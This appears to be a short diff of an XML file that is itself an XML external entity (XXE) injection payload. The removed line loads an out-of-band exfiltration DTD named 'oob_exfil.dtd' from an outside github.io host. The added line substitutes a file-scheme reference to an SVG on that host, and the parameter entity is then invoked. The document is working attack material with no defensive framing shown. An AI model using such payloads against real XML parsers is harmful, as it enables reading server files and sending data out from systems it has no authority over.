@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
 <!DOCTYPE a [
-   <!ENTITY % asd SYSTEM "https://fkillrra.github.io//oob_exfil.dtd"> 
+   <!ENTITY % asd SYSTEM 'file://///fkillrra.github.io/ic_image.svg'> 
    %asd;  
 ]>
